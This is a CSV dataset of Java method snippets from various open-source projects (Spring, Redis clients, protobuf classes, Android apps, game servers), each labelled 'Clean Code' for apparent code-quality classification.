text,label,text_label
"@Bean public JobDetail dealCategoryJobDetail(){
  return JobBuilder.newJob(DealCategoryJob.class).withIdentity(DealCategoryJob.class.getName()).storeDurably().build();
}
",0,Clean Code
"public static RawFlowGraph loadRawFlowGraph(CommentsDatabase database,Diff diff,IAddress functionAddr,ESide side) throws IOException, SQLException {
  var primaryExportFileReader=new BinExport2Reader(diff.getExportFile(ESide.PRIMARY),ESide.PRIMARY);
  var secondaryExportFileReader=new BinExport2Reader(diff.getExportFile(ESide.SECONDARY),ESide.SECONDARY);
  RawFunction function=diff.getCallGraph(side).getFunction(functionAddr);
  if (function == null) {
    return null;
  }
  if (function.getFunctionType() == EFunctionType.IMPORTED) {
    return new RawFlowGraph(functionAddr,function.getName(),function.getFunctionType(),new ArrayList<>(),new ArrayList<>(),side);
  }
  RawFlowGraph flowGraph=side == ESide.PRIMARY ? primaryExportFileReader.readFlowGraph(diff,functionAddr) : secondaryExportFileReader.readFlowGraph(diff,functionAddr);
  String imageHash=diff.getDiffMetaData().getImageHash(side);
  if (database != null) {
    Map<Pair<IAddress,ECommentPlacement>,String> instructionComments=database.readInstructionComments(imageHash,functionAddr);
    Map<IAddress,String> basicBlockComments=database.readBasicblockComments(imageHash,functionAddr);
    setBasicBlockComments(flowGraph,basicBlockComments);
    setInstructionComment(flowGraph,instructionComments);
  }
  return flowGraph;
}",0,Clean Code
"@Override public Boolean exists(String key){
  return jedisCluster.exists(key);
}
",0,Clean Code
"public MistralAiEmbeddingOptions getOptions(){
  return this.options;
}
",0,Clean Code
"private PolynomialKernelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private PolynomialKernelProto(){
}
!org.eclipse.jdt.core.dom.MethodDeclaration@426c5a49",0,Clean Code
"@Override public void add(ChatMessage message){
  List<ChatMessage> messages=messages();
  if (message instanceof SystemMessage) {
    Optional<SystemMessage> systemMessage=findSystemMessage(messages);
    if (systemMessage.isPresent()) {
      if (systemMessage.get().equals(message)) {
        return;
      }
 else {
        messages.remove(systemMessage.get());
      }
    }
  }
  messages.add(message);
  ensureCapacity(messages,maxMessages);
  store.updateMessages(id,messages);
}
",0,Clean Code
"public int getBeamWidth(){
  return beamWidth;
}
",0,Clean Code
"@Override public void visitPair(VmPair value){
  cannotRenderTypeAddConverter(value);
}
",0,Clean Code
"public static void setMiBackgroundBlurRadius(View view,int i){
  InvokeUtils.callMethod(View.class,view,""setMiBackgroundBlurRadius"",new Class[]{int.class},i);
}
",0,Clean Code
"public HanaCloudVectorStoreConfigBuilder topK(int topK){
  this.topK=topK;
  return this;
}
",0,Clean Code
"public PacketGetShopListScRsp(int shopType){
  super(CmdId.GetShopListScRsp);
  var data=GetShopListScRsp.newInstance().setShopType(shopType);
  for (  ShopExcel shopExcel : GameData.getShopExcelMap().values()) {
    if (shopExcel.getShopType() != shopType || shopExcel.getGoods().size() == 0) {
      continue;
    }
    Shop shop=Shop.newInstance().setShopId(shopExcel.getId()).setCityLevel(1).setEndTime(Integer.MAX_VALUE);
    for (    var goodsExcel : shopExcel.getGoods().values()) {
      shop.addGoodsList(goodsExcel.toProto());
    }
    data.addShopList(shop);
  }
  this.setData(data);
}",0,Clean Code
"@After public void tearDown(){
  TestUtil.deleteQuietly(testDirectory);
}
",0,Clean Code
"RelationshipView parseRelationship(DynamicViewDslContext context,Tokens tokens){
  DynamicView view=context.getView();
  if (tokens.size() > 1 && StructurizrDslTokens.RELATIONSHIP_TOKEN.equals(tokens.get(RELATIONSHIP_TOKEN_INDEX))) {
    if (tokens.hasMoreThan(TECHNOLOGY_INDEX)) {
      throw new RuntimeException(""Too many tokens, expected: "" + GRAMMAR_1);
    }
    if (!tokens.includes(DESTINATION_IDENTIFIER_INDEX)) {
      throw new RuntimeException(""Expected: "" + GRAMMAR_1);
    }
    String sourceId=tokens.get(SOURCE_IDENTIFIER_INDEX);
    String destinationId=tokens.get(DESTINATION_IDENTIFIER_INDEX);
    Element sourceElement=context.getElement(sourceId);
    if (sourceElement == null) {
      throw new RuntimeException(""The source element \"""" + sourceId + ""\"" does not exist"");
    }
    if (!(sourceElement instanceof StaticStructureElement || sourceElement instanceof CustomElement)) {
      throw new RuntimeException(""The source element \"""" + sourceId + ""\"" should be a static structure or custom element"");
    }
    Element destinationElement=context.getElement(destinationId);
    if (destinationElement == null) {
      throw new RuntimeException(""The destination element \"""" + destinationId + ""\"" does not exist"");
    }
    if (!(destinationElement instanceof StaticStructureElement || destinationElement instanceof CustomElement)) {
      throw new RuntimeException(""The destination element \"""" + destinationId + ""\"" should be a static structure or custom element"");
    }
    String description="""";
    if (tokens.includes(DESCRIPTION_INDEX)) {
      description=tokens.get(DESCRIPTION_INDEX);
    }
    String technology="""";
    if (tokens.includes(TECHNOLOGY_INDEX)) {
      technology=tokens.get(TECHNOLOGY_INDEX);
    }
    if (sourceElement instanceof StaticStructureElement && destinationElement instanceof StaticStructureElement) {
      return view.add((StaticStructureElement)sourceElement,description,technology,(StaticStructureElement)destinationElement);
    }
 else     if (sourceElement instanceof StaticStructureElement && destinationElement instanceof CustomElement) {
      return view.add((StaticStructureElement)sourceElement,description,technology,(CustomElement)destinationElement);
    }
 else     if (sourceElement instanceof CustomElement && destinationElement instanceof StaticStructureElement) {
      return view.add((CustomElement)sourceElement,description,technology,(StaticStructureElement)destinationElement);
    }
 else     if (sourceElement instanceof CustomElement && destinationElement instanceof CustomElement) {
      return view.add((CustomElement)sourceElement,description,technology,(CustomElement)destinationElement);
    }
  }
 else {
    String relationshipId=tokens.get(RELATIONSHIP_IDENTIFIER_INDEX);
    Relationship relationship=context.getRelationship(relationshipId);
    if (tokens.hasMoreThan(RELATIONSHIP_IDENTIFIER_INDEX + 1)) {
      throw new RuntimeException(""Too many tokens, expected: "" + GRAMMAR_2);
    }
    if (relationship == null) {
      throw new RuntimeException(""The relationship \"""" + relationshipId + ""\"" does not exist"");
    }
    String description="""";
    if (tokens.includes(RELATIONSHIP_IDENTIFIER_INDEX + 1)) {
      description=tokens.get(RELATIONSHIP_IDENTIFIER_INDEX + 1);
    }
    return view.add(relationship,description);
  }
  throw new RuntimeException(""The specified relationship could not be added"");
}",0,Clean Code
"@Override public void execute(CommandArgs args){
  if (LunarCore.getGameDatabase() == null) {
    args.sendMessage(""Error: Game database not connected"");
    return;
  }
  if (args.getTarget() != null) {
    args.sendMessage(""Error: Targeted player is online"");
    return;
  }
  Player player=LunarCore.getGameDatabase().getObjectByField(Player.class,""_id"",args.getTargetUid());
  if (player != null) {
    player.resetPosition();
    player.save();
    args.sendMessage(""Player unstuck successfully"");
  }
 else {
    args.sendMessage(""Error: Player not found in database"");
  }
}
",0,Clean Code
"public Builder withMetadataFields(MetadataField... fields){
  return withMetadataFields(Arrays.asList(fields));
}
public Builder withMetadataFields(List<MetadataField> fields){
  this.metadataFields=fields;
  return this;
}
",0,Clean Code
"@Override public synchronized void stop(){
  logger.info(""[STOP {} SOURCE]{} stopping..."",this.getProtocolName(),this.cachedSrcName);
  if (!allChannels.isEmpty()) {
    try {
      allChannels.close().awaitUninterruptibly();
    }
 catch (    Exception e) {
      logger.warn(""Close {} netty channels throw exception"",this.cachedSrcName,e);
    }
 finally {
      allChannels.clear();
    }
  }
  if (channelFuture != null) {
    try {
      channelFuture.channel().closeFuture().sync();
    }
 catch (    InterruptedException e) {
      logger.warn(""Close {} channel future throw exception"",this.cachedSrcName,e);
    }
  }
  super.stop();
  if (this.acceptorGroup != null) {
    this.acceptorGroup.shutdownGracefully();
  }
  if (this.workerGroup != null) {
    this.workerGroup.shutdownGracefully();
  }
  if (enableFileMetric) {
    if (monitorIndex != null) {
      monitorIndex.stop();
    }
    if (monitorStats != null) {
      monitorStats.stop();
    }
  }
  logger.info(""[STOP {} SOURCE]{} stopped"",this.getProtocolName(),this.cachedSrcName);
}
",0,Clean Code
"@Override protected void onActivityResult(int requestCode,int resultCode,Intent data){
  if (SharedConfig.passcodeHash.length() != 0 && SharedConfig.lastPauseTime != 0) {
    SharedConfig.lastPauseTime=0;
    if (BuildVars.LOGS_ENABLED) {
      FileLog.d(""reset lastPauseTime onActivityResult"");
    }
    UserConfig.getInstance(currentAccount).saveConfig(false);
  }
  if (requestCode == 105) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
      if (ApplicationLoader.canDrawOverlays=Settings.canDrawOverlays(this)) {
        if (GroupCallActivity.groupCallInstance != null) {
          GroupCallActivity.groupCallInstance.dismissInternal();
        }
        AndroidUtilities.runOnUIThread(() -> {
          GroupCallPip.clearForce();
          GroupCallPip.updateVisibility(LaunchActivity.this);
        }
,200);
      }
    }
    return;
  }
  super.onActivityResult(requestCode,resultCode,data);
  if (requestCode == SCREEN_CAPTURE_REQUEST_CODE) {
    if (resultCode == Activity.RESULT_OK) {
      VoIPService service=VoIPService.getSharedInstance();
      if (service != null) {
        VideoCapturerDevice.mediaProjectionPermissionResultData=data;
        service.createCaptureDevice(true);
      }
    }
  }
 else   if (callbacks.containsKey(requestCode)) {
    callbacks.remove(requestCode).invoke(data);
    return;
  }
  ThemeEditorView editorView=ThemeEditorView.getInstance();
  if (editorView != null) {
    editorView.onActivityResult(requestCode,resultCode,data);
  }
  if (actionBarLayout.getFragmentStack().size() != 0) {
    BaseFragment fragment=actionBarLayout.getFragmentStack().get(actionBarLayout.getFragmentStack().size() - 1);
    fragment.onActivityResultFragment(requestCode,resultCode,data);
  }
  if (AndroidUtilities.isTablet()) {
    if (rightActionBarLayout.getFragmentStack().size() != 0) {
      BaseFragment fragment=rightActionBarLayout.getFragmentStack().get(rightActionBarLayout.getFragmentStack().size() - 1);
      fragment.onActivityResultFragment(requestCode,resultCode,data);
    }
    if (layersActionBarLayout.getFragmentStack().size() != 0) {
      BaseFragment fragment=layersActionBarLayout.getFragmentStack().get(layersActionBarLayout.getFragmentStack().size() - 1);
      fragment.onActivityResultFragment(requestCode,resultCode,data);
    }
    NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.onActivityResultReceived,requestCode,resultCode,data);
  }
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.classification.sgd.protos.FMClassificationModelProto)) {
    return super.equals(obj);
  }
  org.tribuo.classification.sgd.protos.FMClassificationModelProto other=(org.tribuo.classification.sgd.protos.FMClassificationModelProto)obj;
  if (hasMetadata() != other.hasMetadata())   return false;
  if (hasMetadata()) {
    if (!getMetadata().equals(other.getMetadata()))     return false;
  }
  if (hasParams() != other.hasParams())   return false;
  if (hasParams()) {
    if (!getParams().equals(other.getParams()))     return false;
  }
  if (hasNormalizer() != other.hasNormalizer())   return false;
  if (hasNormalizer()) {
    if (!getNormalizer().equals(other.getNormalizer()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"@Specialization(rewriteOn=FrameSlotTypeException.class) protected Object evalObject(VirtualFrame frame) throws FrameSlotTypeException {
  return frame.getObject(slot);
}
",0,Clean Code
"/** 
 * <code>optional uint32 unique_id = 9;</code>
 * @return this
 */
public RogueCommonPendingAction clearUniqueId(){
  bitField0_&=~0x00000001;
  uniqueId=0;
  return this;
}",0,Clean Code
"/** 
 * Save the disabled components in the  {@link #SYSTEM_RULES_PATH}.
 * @return {@code true} iff the components could be saved.
 */
private boolean saveDisabledComponents(boolean apply){
  if (readOnly) {
    Log.e(TAG,""Read-only instance."");
    return false;
  }
  if (!apply || componentCount() == 0) {
    mRulesFile.delete();
    return true;
  }
  StringBuilder activities=new StringBuilder();
  StringBuilder services=new StringBuilder();
  StringBuilder receivers=new StringBuilder();
  for (  ComponentRule component : getAllComponents()) {
    if (!component.isIfw())     continue;
    String componentFilter=""  <component-filter name=\"""" + packageName + ""/""+ component.name+ ""\""/>\n"";
switch (component.type) {
case ACTIVITY:
      activities.append(componentFilter);
    break;
case RECEIVER:
  receivers.append(componentFilter);
break;
case SERVICE:
services.append(componentFilter);
break;
case PROVIDER:
}
}
String rules=""<rules>\n"" + ((activities.length() == 0) ? """" : ""<activity block=\""true\"" log=\""false\"">\n"" + activities + ""</activity>\n"") + ((services.length() == 0) ? """" : ""<service block=\""true\"" log=\""false\"">\n"" + services + ""</service>\n"")+ ((receivers.length() == 0) ? """" : ""<broadcast block=\""true\"" log=\""false\"">\n"" + receivers + ""</broadcast>\n"")+ ""</rules>"";
FileOutputStream rulesStream=null;
try {
rulesStream=mRulesFile.startWrite();
Log.d(TAG,""Rules: %s"",rules);
rulesStream.write(rules.getBytes());
mRulesFile.finishWrite(rulesStream);
mRulesFile.getBaseFile().setMode(0666);
return true;
}
 catch (IOException e) {
Log.e(TAG,""Failed to write rules for package %s"",e,packageName);
mRulesFile.failWrite(rulesStream);
return false;
}
catch (ErrnoException e) {
Log.w(TAG,""Failed to alter permission of IFW for package %s"",e,packageName);
return true;
}
}",0,Clean Code
"@NonNull List<Integer> getSpecialType();
",0,Clean Code
"@Test public void ex3(){
  var ex3=module.getProperty(""ex3"");
  List<Byte> mapped1=mapper.map(ex3,Types.listOf(Byte.class));
  assertThat(mapped1).containsExactly((byte)1,(byte)2,(byte)3);
  List<Short> mapped2=mapper.map(ex3,Types.listOf(Short.class));
  assertThat(mapped2).containsExactly((short)1,(short)2,(short)3);
  List<Integer> mapped3=mapper.map(ex3,Types.listOf(Integer.class));
  assertThat(mapped3).containsExactly(1,2,3);
  List<Long> mapped4=mapper.map(ex3,Types.listOf(Long.class));
  assertThat(mapped4).containsExactly(1L,2L,3L);
}",0,Clean Code
"public int maxDegree(){
  return maxDegree;
}
",0,Clean Code
"public ClaudeAiStreamClient build(){
  return new ClaudeAiStreamClient(this);
}
",0,Clean Code
"@Override public void visibilityChanged(){
  AbstractGraphNodeTree.this.updateUI();
}
",0,Clean Code
"@Override public Long setnx(final String key,final String value){
  try {
    return redis.setnx(key,value);
  }
 catch (  Exception e) {
    throw new JedisException(e);
  }
}
",0,Clean Code
"@Override public V put(K key,V value){
  array[offset++]=key;
  array[offset++]=value;
  return null;
}
",0,Clean Code
"/** 
 * extract and process bin heart beat msg, message type is 8
 */
private void procBinHeartbeatMsg(BaseSource source,Channel channel,ByteBuf cb,int totalDataLen) throws Exception {
  if (totalDataLen < BIN_HB_FIXED_CONTENT_SIZE) {
    source.fileMetricIncSumStats(StatConstants.EVENT_MSG_HB_TOTALLEN_BELOWMIN);
    String errMsg=String.format(""Malformed msg, totalDataLen(%d) < min hb-msg length(%d)"",totalDataLen,BIN_HB_FIXED_CONTENT_SIZE);
    if (logger.isDebugEnabled()) {
      logger.debug(errMsg + "", channel {}"",channel);
    }
    throw new PkgParseException(errMsg);
  }
  int msgHeadPos=cb.readerIndex() - 5;
  int bodyLen=cb.getInt(msgHeadPos + BIN_HB_BODYLEN_OFFSET);
  int attrLen=cb.getShort(msgHeadPos + BIN_HB_BODY_OFFSET + bodyLen);
  int msgMagic=cb.getUnsignedShort(msgHeadPos + BIN_HB_BODY_OFFSET + bodyLen+ BIN_HB_ATTRLEN_SIZE+ attrLen);
  if (msgMagic != BIN_MSG_MAGIC) {
    source.fileMetricIncSumStats(StatConstants.EVENT_MSG_HB_MAGIC_UNEQUAL);
    String errMsg=String.format(""Malformed msg, msgMagic(%d) != %d"",msgMagic,BIN_MSG_MAGIC);
    if (logger.isDebugEnabled()) {
      logger.debug(errMsg + "", channel {}"",channel);
    }
    throw new PkgParseException(errMsg);
  }
  if (totalDataLen + BIN_HB_TOTALLEN_SIZE < (bodyLen + attrLen + BIN_HB_FORMAT_SIZE)) {
    source.fileMetricIncSumStats(StatConstants.EVENT_MSG_HB_LEN_MALFORMED);
    String errMsg=String.format(""Malformed msg, bodyLen(%d) + attrLen(%d) > totalDataLen(%d)"",bodyLen,attrLen,totalDataLen);
    if (logger.isDebugEnabled()) {
      logger.debug(errMsg + "", channel {}"",channel);
    }
    throw new PkgParseException(errMsg);
  }
  byte version=cb.getByte(msgHeadPos + BIN_HB_VERSION_OFFSET);
  byte[] attrData=null;
  if (attrLen > 0) {
    attrData=new byte[attrLen];
    cb.getBytes(msgHeadPos + BIN_HB_BODY_OFFSET + bodyLen+ BIN_HB_ATTRLEN_SIZE,attrData,0,attrLen);
  }
  flushV0MsgPackage(source,channel,buildHBRspPackage(attrData,version,0),MsgType.MSG_BIN_HEARTBEAT.name());
}",0,Clean Code
"@Override public CfCarParkPackagePriceExample getExampleByQuery(CfCarParkPackagePriceQuery cfCarParkPackagePriceQuery){
  CfCarParkPackagePriceExample cfCarParkPackagePriceExample=new CfCarParkPackagePriceExample();
  CfCarParkPackagePriceExample.Criteria criteria=cfCarParkPackagePriceExample.createCriteria();
  if (cfCarParkPackagePriceQuery.getTitle() != null) {
    criteria.andTitleLike(cfCarParkPackagePriceQuery.getTitle());
  }
  if (StringUtils.isNotEmpty(cfCarParkPackagePriceQuery.getId())) {
    criteria.andIdEqualTo(cfCarParkPackagePriceQuery.getId());
  }
  if (StringUtils.isNotEmpty(cfCarParkPackagePriceQuery.getCarParkId())) {
    criteria.andCarParkIdEqualTo(cfCarParkPackagePriceQuery.getCarParkId());
  }
  if (cfCarParkPackagePriceQuery.getCarParkIds() != null && cfCarParkPackagePriceQuery.getCarParkIds().size() > 0) {
    criteria.andCarParkIdIn(cfCarParkPackagePriceQuery.getCarParkIds());
  }
  if (StringUtils.isNotEmpty(cfCarParkPackagePriceQuery.getFlagKey())) {
    criteria.andFlagKeyEqualTo(cfCarParkPackagePriceQuery.getFlagKey());
  }
  if (cfCarParkPackagePriceQuery.getSpecialGive() != null) {
    criteria.andSpecialGiveEqualTo(cfCarParkPackagePriceQuery.getSpecialGive());
  }
  if (cfCarParkPackagePriceQuery.getSpecialCarPackage() != null) {
    criteria.andSpecialCarPackageEqualTo(cfCarParkPackagePriceQuery.getSpecialCarPackage());
  }
  if (StringUtils.isNotEmpty(cfCarParkPackagePriceQuery.getOrderBy())) {
    cfCarParkPackagePriceExample.setOrderByClause(cfCarParkPackagePriceQuery.getOrderBy());
  }
  if (StringUtils.isNotEmpty(cfCarParkPackagePriceQuery.getOrderBy())) {
    cfCarParkPackagePriceExample.setOrderByClause(cfCarParkPackagePriceQuery.getOrderBy());
  }
  if (cfCarParkPackagePriceQuery.getPage() != null && cfCarParkPackagePriceQuery.getSize() != null) {
    PageHelper.startPage(cfCarParkPackagePriceQuery.getPage(),cfCarParkPackagePriceQuery.getSize());
  }
  return cfCarParkPackagePriceExample;
}",0,Clean Code
"@Bean @ConditionalOnMissingBean public OpenAiAudioSpeechClient openAiAudioSpeechClient(OpenAiConnectionProperties commonProperties,OpenAiAudioSpeechProperties speechProperties,ResponseErrorHandler responseErrorHandler){
  String apiKey=StringUtils.hasText(speechProperties.getApiKey()) ? speechProperties.getApiKey() : commonProperties.getApiKey();
  String baseUrl=StringUtils.hasText(speechProperties.getBaseUrl()) ? speechProperties.getBaseUrl() : commonProperties.getBaseUrl();
  Assert.hasText(apiKey,""OpenAI API key must be set"");
  Assert.hasText(baseUrl,""OpenAI base URL must be set"");
  var openAiAudioApi=new OpenAiAudioApi(baseUrl,apiKey,RestClient.builder(),responseErrorHandler);
  OpenAiAudioSpeechClient openAiSpeechClient=new OpenAiAudioSpeechClient(openAiAudioApi,speechProperties.getOptions());
  return openAiSpeechClient;
}
",0,Clean Code
"public static HandleFriendScRsp parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new HandleFriendScRsp(),data).checkInitialized();
}
public static HandleFriendScRsp parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new HandleFriendScRsp(),input).checkInitialized();
}
public static HandleFriendScRsp parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new HandleFriendScRsp(),input).checkInitialized();
}
",0,Clean Code
"/** 
 * Returns an OutputStream to write to the file. The file will be truncated immediately.
 */
private static int getTemporaryAlbumId(final Context context){
  final File temporaryTrack;
  try {
    temporaryTrack=installTemporaryTrack(context);
  }
 catch (  final IOException ex) {
    Log.w(""MediaFile"",""Error installing temporary track."",ex);
    return 0;
  }
  final Uri filesUri=MediaStore.Files.getContentUri(""external"");
  final String[] selectionArgs={temporaryTrack.getAbsolutePath()};
  final ContentResolver contentResolver=context.getContentResolver();
  Cursor cursor=contentResolver.query(filesUri,ALBUM_PROJECTION,MediaStore.MediaColumns.DATA + ""=?"",selectionArgs,null);
  if (cursor == null || !cursor.moveToFirst()) {
    if (cursor != null) {
      cursor.close();
      cursor=null;
    }
    final ContentValues values=new ContentValues();
    values.put(MediaStore.MediaColumns.DATA,temporaryTrack.getAbsolutePath());
    values.put(MediaStore.MediaColumns.TITLE,""{MediaWrite Workaround}"");
    values.put(MediaStore.MediaColumns.SIZE,temporaryTrack.length());
    values.put(MediaStore.MediaColumns.MIME_TYPE,""audio/mpeg"");
    values.put(MediaStore.Audio.AudioColumns.IS_MUSIC,true);
    contentResolver.insert(filesUri,values);
  }
  cursor=contentResolver.query(filesUri,ALBUM_PROJECTION,MediaStore.MediaColumns.DATA + ""=?"",selectionArgs,null);
  if (cursor == null) {
    return 0;
  }
  if (!cursor.moveToFirst()) {
    cursor.close();
    return 0;
  }
  final int id=cursor.getInt(0);
  final int albumId=cursor.getInt(1);
  final int mediaType=cursor.getInt(2);
  cursor.close();
  final ContentValues values=new ContentValues();
  boolean updateRequired=false;
  if (albumId == 0) {
    values.put(MediaStore.Audio.AlbumColumns.ALBUM_ID,13371337);
    updateRequired=true;
  }
  if (mediaType != 2) {
    values.put(""media_type"",2);
    updateRequired=true;
  }
  if (updateRequired) {
    contentResolver.update(filesUri,values,BaseColumns._ID + ""="" + id,null);
  }
  cursor=contentResolver.query(filesUri,ALBUM_PROJECTION,MediaStore.MediaColumns.DATA + ""=?"",selectionArgs,null);
  if (cursor == null) {
    return 0;
  }
  try {
    if (!cursor.moveToFirst()) {
      return 0;
    }
    return cursor.getInt(1);
  }
  finally {
    cursor.close();
  }
}",0,Clean Code
"protected void onGuildUserMedalsUpdated(String str,String str2){
}",0,Clean Code
"private GradleProject updateGradleModel(GradleProject gp){
  Map<String,GradleDependencyConfiguration> nameToConfiguration=gp.getNameToConfiguration();
  Map<String,GradleDependencyConfiguration> newNameToConfiguration=new HashMap<>(nameToConfiguration.size());
  boolean anyChanged=false;
  for (  GradleDependencyConfiguration gdc : nameToConfiguration.values()) {
    GradleDependencyConfiguration newGdc=gdc;
    newGdc=newGdc.withRequested(ListUtils.map(gdc.getRequested(),requested -> {
      if (depMatcher.matches(requested.getGroupId(),requested.getArtifactId())) {
        GroupArtifactVersion gav=requested.getGav();
        if (newGroupId != null) {
          gav=gav.withGroupId(newGroupId);
        }
        if (newArtifactId != null) {
          gav=gav.withArtifactId(newArtifactId);
        }
        if (gav != requested.getGav()) {
          return requested.withGav(gav);
        }
      }
      return requested;
    }
));
    newGdc=newGdc.withDirectResolved(ListUtils.map(gdc.getDirectResolved(),resolved -> {
      if (depMatcher.matches(resolved.getGroupId(),resolved.getArtifactId())) {
        ResolvedGroupArtifactVersion gav=resolved.getGav();
        if (newGroupId != null) {
          gav=gav.withGroupId(newGroupId);
        }
        if (newArtifactId != null) {
          gav=gav.withArtifactId(newArtifactId);
        }
        if (gav != resolved.getGav()) {
          return resolved.withGav(gav);
        }
      }
      return resolved;
    }
));
    anyChanged|=newGdc != gdc;
    newNameToConfiguration.put(newGdc.getName(),newGdc);
  }
  if (anyChanged) {
    gp=gp.withNameToConfiguration(newNameToConfiguration);
  }
  return gp;
}
",0,Clean Code
"/** 
 * <code>optional string signature = 9;</code>
 * @return the signature
 */
public String getSignature(){
  return signature.getString();
}",0,Clean Code
"/** 
 * <code>optional .ChessRogueMiracleData miracle_data = 13;</code>
 * @param value the miracleData to set
 * @return this
 */
public ChessRogueMiracleInfo setMiracleData(final ChessRogueMiracleDataOuterClass.ChessRogueMiracleData value){
  bitField0_|=0x00000001;
  miracleData.copyFrom(value);
  return this;
}",0,Clean Code
"public int getItemCountInternal(){
  if (foundContextBot != null && !inlineMediaEnabled) {
    return 1;
  }
  if (stickers != null) {
    return stickers.size();
  }
 else   if (searchResultBotContext != null) {
    return searchResultBotContext.size() + (searchResultBotContextSwitch != null || searchResultBotWebViewSwitch != null ? 1 : 0);
  }
 else   if (searchResultUsernames != null) {
    return searchResultUsernames.size();
  }
 else   if (searchResultHashtags != null) {
    return searchResultHashtags.size();
  }
 else   if (searchResultCommands != null) {
    return searchResultCommands.size();
  }
 else   if (searchResultSuggestions != null) {
    return searchResultSuggestions.size();
  }
  return 0;
}",0,Clean Code
"/** 
 * @return a new empty instance of {@code BattleEquipment}
 */
public static BattleEquipment newInstance(){
  return new BattleEquipment();
}
",0,Clean Code
"@Override public Boolean parse(String string){
  return Boolean.parseBoolean(string);
}
",0,Clean Code
"public static void visitFriendToday(String id,int count){
  id=FriendIdMap.getCurrentUid() + ""-"" + id;
  Statistics stat=getStatistics();
  VisitFriendLog vfl;
  int index=-1;
  for (int i=0; i < stat.visitFriendLogList.size(); i++)   if (stat.visitFriendLogList.get(i).userId.equals(id)) {
    index=i;
    break;
  }
  if (index < 0) {
    vfl=new VisitFriendLog(id);
    stat.visitFriendLogList.add(vfl);
  }
 else {
    vfl=stat.visitFriendLogList.get(index);
  }
  vfl.visitCount=count;
  save();
}",0,Clean Code
